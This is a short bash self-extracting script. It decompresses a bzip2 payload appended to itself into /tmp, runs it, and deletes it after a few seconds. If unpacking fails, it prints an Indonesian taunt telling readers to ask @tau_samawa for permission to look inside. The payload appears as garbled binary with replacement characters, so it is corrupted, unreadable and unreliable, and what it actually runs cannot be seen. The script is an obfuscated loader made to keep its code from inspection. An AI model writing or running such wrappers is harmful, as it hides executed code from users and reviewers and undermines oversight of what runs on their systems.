#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��=�  ]߀ y�W?�ߚ����Pl�� �j�F�L�F	��mC&�b`00 	� �1Q��@  C@ A���A=H�T��?Q����d!�"����x������@4h �O�O�P�,d�"9�G�(;�;H�1�&�vU	2KdkèO>���'$�$a �d���(͌�My�m0�r���M�&5�E�4�O��pd%�� �7Z�HC,�D����z��O�mHX��f��#�ɹ���5���J%󟇅Cť��4��n-,83k!������[Y���0?a�������o����`�KG�:��4y0X�'`�Fx>m��l
���pa��$4hu=�&�jia�a�!�߃����=����yi_��8,�<��v�f������#�*ov���Xj���h�A&Ǭ��x��kqd$6��;��v�7i@�K �����|{�s��{����w�� t6�k�5t8׵�R��W���!ɛ)C!��y<�R6���X44C�S��"��$㛱͜���R6���\��N��J96���K���8��b
P$3kq�`z�H{4��\�L��q}�ћ�b;��!���=8��?ùj���ԿWݭ�C��������/���6�8<��O%�*S[r�x,0�=cJ޶*��H�lai���70��d���Җ��40��:WR�Z�d��5���or���5�{k@kzsknk;��� kW@RL��,q���m��t�ڃ\�	S�� ���ܑN$(��w�